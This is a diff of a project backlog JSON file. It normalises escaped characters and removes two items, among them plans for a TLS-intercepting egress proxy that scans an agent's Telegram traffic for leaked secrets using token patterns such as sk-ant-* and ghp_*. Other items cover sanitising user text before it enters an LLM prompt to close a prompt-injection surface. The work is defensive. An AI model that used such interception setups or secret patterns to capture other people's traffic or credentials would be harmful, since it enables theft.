+        "Add telegram-egress-proxy.py as static asset — HTTPS reverse proxy scanning Bot API payloads (sendMessage, editMessageText, etc.) for embedded secrets",
+        "Add CA cert generation script: gen-telegram-certs.sh — generates self-signed CA + server cert for api.telegram.org",
         "Extend compose.ts to add telegram-proxy sidecar when channel=telegram AND posture=hardened|under-attack",
-        "Add extra_hosts to openclaw service: api.telegram.org \u2192 proxy container IP",
+        "Add extra_hosts to openclaw service: api.telegram.org → proxy container IP",
         "Add NODE_EXTRA_CA_CERTS env var to openclaw service pointing to injected CA cert",
         "Add cert volume mounts: CA cert read-only into openclaw, server cert into proxy",
         "Add proxy audit logging volume: ops/security/telegram-egress-audit.jsonl",
@@ -668,7 +668,7 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-04-06",
-      "groomingNotes": "FEAT-136 defines the proxy itself. This item is about compose generation and cert infrastructure. The proxy script is a static Python3 asset (~600 lines from the manual prototype, generalized). Secret patterns to scan: look for env var values from .env file, common token patterns (sk-ant-*, ghp_*, Bearer tokens). The extra_hosts trick works because Docker resolves it before DNS \u2014 the container thinks it's talking to api.telegram.org but traffic goes to the local proxy. The proxy terminates TLS, scans the HTTP payload, then forwards to the real api.telegram.org. Cert generation runs once during clawhq init, not on every build. Certs stored in ops/security/telegram-proxy-certs/. Only generated for Telegram \u2014 other channels don't have this attack surface (WhatsApp uses a different protocol, Discord uses webhooks)."
+      "groomingNotes": "FEAT-136 defines the proxy itself. This item is about compose generation and cert infrastructure. The proxy script is a static Python3 asset (~600 lines from the manual prototype, generalized). Secret patterns to scan: look for env var values from .env file, common token patterns (sk-ant-*, ghp_*, Bearer tokens). The extra_hosts trick works because Docker resolves it before DNS — the container thinks it's talking to api.telegram.org but traffic goes to the local proxy. The proxy terminates TLS, scans the HTTP payload, then forwards to the real api.telegram.org. Cert generation runs once during clawhq init, not on every build. Certs stored in ops/security/telegram-proxy-certs/. Only generated for Telegram — other channels don't have this attack surface (WhatsApp uses a different protocol, Discord uses webhooks)."
     },
     {
       "id": "FEAT-157",
@@ -698,11 +698,11 @@
       "status": "todo",
       "readyForSprint": true,
       "groomedAt": "2026-04-08",
-      "groomingNotes": "Split from FEAT-156. morning-brief and construct are platform skills created by FEAT-152. Check if they already exist under src/design/skills/platform/ \u2014 if not, they may be under a different path. morning-brief enrichment: add the gather template (what to check) and compose template (how to format) from the manual prototype, generalized for any blueprint profile. construct enrichment: add the 5-phase cycle (assess current state, propose changes, build implementation, deploy changes, validate results)."
+      "groomingNotes": "Split from FEAT-156. morning-brief and construct are platform skills created by FEAT-152. Check if they already exist under src/design/skills/platform/ — if not, they may be under a different path. morning-brief enrichment: add the gather template (what to check) and compose template (how to format) from the manual prototype, generalized for any blueprint profile. construct enrichment: add the 5-phase cycle (assess current state, propose changes, build implementation, deploy changes, validate results)."
     },
     {
       "id": "FEAT-159",
-      "title": "Deduplicate identity file generation \u2014 generate once, derive metadata and content from same source",
+      "title": "Deduplicate identity file generation — generate once, derive metadata and content from same source",
       "intent": "The deployment bundle must be internally consistent. Identity files generated twice with independent calls can diverge. Generate once, use the result for both metadata and content.",
       "description": "buildIdentityFiles() in generate.ts calls generateIdentityFiles() to produce full content, then discards it and keeps only metadata (name, path, sizeBytes). The writer later calls generateIdentityFiles() again independently to get the content. This means identity files are rendered twice per forge, and the metadata in the bundle may not match the content the writer eventually writes (different timestamps, nondeterministic rendering). The DeploymentBundle should carry content alongside metadata, or the generator should produce both from a single call.",
       "priority": "should",
@@ -729,12 +729,12 @@
       "status": "done",
       "readyForSprint": true,
       "groomedAt": "2026-04-08",
-      "groomingNotes": "Confirmed: buildIdentityFiles() (generate.ts:506-517) calls generateIdentityFiles() then maps to metadata-only. The writer path must regenerate independently. Fix approach: extend IdentityFileInfo to include an optional content field, or create IdentityFileBundleEntry = IdentityFileInfo & { content: string }. The same pattern applies to buildToolFiles() and buildSkillFiles() \u2014 consider fixing all three for consistency, but scope this item to identity files only.",
+      "groomingNotes": "Confirmed: buildIdentityFiles() (generate.ts:506-517) calls generateIdentityFiles() then maps to metadata-only. The writer path must regenerate independently. Fix approach: extend IdentityFileInfo to include an optional content field, or create IdentityFileBundleEntry = IdentityFileInfo & { content: string }. The same pattern applies to buildToolFiles() and buildSkillFiles() — consider fixing all three for consistency, but scope this item to identity files only.",
       "passes": true
     },
     {
       "id": "FEAT-160",
-      "title": "Deduplicate delegated rules compilation \u2014 single build, derive metadata and content",
+      "title": "Deduplicate delegated rules compilation — single build, derive metadata and content",
       "intent": "The delegation rules compilation must produce consistent metadata and content. Two independent calls with separate Date.now() timestamps is a correctness defect in a deployment bundle that must be internally consistent.",
       "description": "buildDelegatedRulesFile() and generateDelegatedRulesContent() in generate.ts independently construct the same CompiledDelegationRules object with separate new Date().toISOString() calls. If both are called for the same bundle, they produce different generatedAt timestamps. The metadata (ruleCount, categoryCount) and content (JSON string) should come from a single compilation.",
       "priority": "should",
@@ -762,43 +762,10 @@
       "passes": true
     },
     {
-      "id": "FEAT-161",
-      "title": "Harden .env merge parser \u2014 handle quoted values and inline comments",
-      "intent": "Credentials flow through the .env merge path. A quoted value like API_KEY=\"sk-ant-abc123\" must survive merge intact, not be corrupted by naive parsing that includes the quotes as literal value characters.",
-      "description": "parseEnvFile() in writer.ts handles only bare KEY=VALUE lines. Real .env files commonly use quoted values (KEY=\"value with spaces\"), inline comments (KEY=value # comment), and the dotenv convention of stripping surrounding quotes. The mergeEnv() function is used during clawhq init to preserve existing credentials when regenerating config \u2014 corrupting credentials during merge means the agent silently loses API access.",
-      "priority": "should",
-      "category": "core",
-      "steps": [
-        "Update parseEnvFile() to strip surrounding single or double quotes from values",
-        "Update parseEnvFile() to strip inline comments (# preceded by whitespace, outside quotes)",
-        "Preserve the raw line format when not substituting (don't normalize quotes)",
-        "In mergeEnv(), when preserving an old value, use the raw line format from the existing file",
-        "Add test: KEY=\"value with spaces\" parses as KEY \u2192 value with spaces",
-        "Add test: KEY=value # comment parses as KEY \u2192 value",
-        "Add test: KEY='single quoted' parses as KEY \u2192 single quoted",
-        "Add test: merge preserves quoted format from existing file",
-        "Add test: KEY=value#nospace is NOT treated as a comment (# must be preceded by space)"
-      ],
-      "acceptanceCriteria": [
-        "parseEnvFile('API_KEY=\"sk-ant-abc123\"') returns Map with API_KEY \u2192 sk-ant-abc123 (quotes stripped)",
-        "parseEnvFile('KEY=value # this is a comment') returns Map with KEY \u2192 value",
-        "parseEnvFile('URL=https://example.com#anchor') returns Map with URL \u2192 https://example.com#anchor (no space before #, not a comment)",
-        "mergeEnv preserves existing real values in their original format (including surrounding quotes if present)",
-        "TypeScript compiles cleanly"
-      ],
-      "scope": [
-        "src/design/configure/writer.ts"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "groomedAt": "2026-04-08",
-      "groomingNotes": "Confirmed: parseEnvFile() (writer.ts:109-119) does bare indexOf('=') split with no quote handling. The mergeEnv logic (writer.ts:130-162) substitutes lines by index. Fix approach: add quote stripping to parseEnvFile for comparison purposes, but preserve raw lines in mergeEnv for format stability. Do NOT add multiline value support \u2014 that's a larger change and .env files in practice use single lines. Tests go in writer.test.ts alongside existing atomic write tests."
-    },
-    {
       "id": "FEAT-162",
       "title": "Sanitize user description in smart inference prompt",
       "intent": "All user-provided text that enters an LLM prompt must be sanitized. The smart inference path interpolates raw user input into the Ollama prompt without the sanitization applied everywhere else in the codebase.",
-      "description": "smart.ts:227 interpolates the user's natural language description directly into the Ollama prompt string. While this currently runs locally, the codebase consistently sanitizes user input via sanitizeContentSync() everywhere else (soul.ts customization answers, user.ts context). The smart inference path is the only place where user text enters an LLM prompt unsanitized. Consistency matters \u2014 if smart inference is ever exposed via API or if the description comes from a config file, this is a prompt injection surface.",
+      "description": "smart.ts:227 interpolates the user's natural language description directly into the Ollama prompt string. While this currently runs locally, the codebase consistently sanitizes user input via sanitizeContentSync() everywhere else (soul.ts customization answers, user.ts context). The smart inference path is the only place where user text enters an LLM prompt unsanitized. Consistency matters — if smart inference is ever exposed via API or if the description comes from a config file, this is a prompt injection surface.",
       "priority": "should",
       "category": "security",
       "steps": [
@@ -820,37 +787,8 @@
       "status": "done",
       "readyForSprint": true,
       "groomedAt": "2026-04-08",
-      "groomingNotes": "Confirmed: smart.ts:227 uses raw ${description} in template literal. sanitizeContentSync is already used in soul.ts (line 148) for customization answers. Import path: '../../secure/sanitizer/index.js'. Apply before buildInferencePrompt call, not inside it \u2014 keeps the prompt builder pure. Tests go in smart.test.ts. XS scope.",
+      "groomingNotes": "Confirmed: smart.ts:227 uses raw ${description} in template literal. sanitizeContentSync is already used in soul.ts (line 148) for customization answers. Import path: '../../secure/sanitizer/index.js'. Apply before buildInferencePrompt call, not inside it — keeps the prompt builder pure. Tests go in smart.test.ts. XS scope.",
       "passes": true
-    },
-    {
-      "id": "FEAT-163",
-      "title": "Extract known models list to single source of truth \u2014 eliminate duplication between config and blueprint validation",
-      "intent": "Adding a new model to the system must require changing one file, not hunting through multiple hardcoded lists. Model list duplication between blueprint validation and config defaults is a divergence risk.",
-      "description": "The known model list (haiku, sonnet, opus, gpt-4, llama3:8b, etc.) is hardcoded in at least two places: src/design/blueprints/validate.ts and referenced in config validation. Adding a new model requires finding and updating all locations. Extract to a single KNOWN_MODELS constant in src/config/defaults.ts and import it wherever needed.",
-      "priority": "could",
-      "category": "core",
-      "steps": [
-        "Add KNOWN_MODELS constant to src/config/defaults.ts with the complete model list",
-        "Update src/design/blueprints/validate.ts to import KNOWN_MODELS instead of maintaining its own list",
-        "Search for any other hardcoded model lists in the codebase and replace with imports",
-        "Add test: KNOWN_MODELS contains all expected model families (haiku, sonnet, opus, gpt-4*, llama3*, mistral*, phi3*, gemma*, qwen2*)",
-        "Verify all existing validation tests still pass"
-      ],
-      "acceptanceCriteria": [
-        "A single KNOWN_MODELS constant exists in src/config/defaults.ts",
-        "src/design/blueprints/validate.ts imports and uses KNOWN_MODELS instead of a local list",
-        "No other file in src/ defines its own model list that duplicates KNOWN_MODELS",
-        "Existing validation tests pass unchanged"
-      ],
-      "scope": [
-        "src/config/defaults.ts",
-        "src/design/blueprints/validate.ts"
-      ],
-      "status": "todo",
-      "readyForSprint": true,
-      "groomedAt": "2026-04-08",
-      "groomingNotes": "Confirmed: blueprints/validate.ts has a KNOWN_MODELS-equivalent list. defaults.ts has other model constants (OLLAMA_DEFAULT_MODEL). Extract the full list to defaults.ts, import in validate.ts. Grep the codebase for model name strings (haiku, sonnet, llama3) to find all duplication sites. XS scope."
     }
   ]
 }
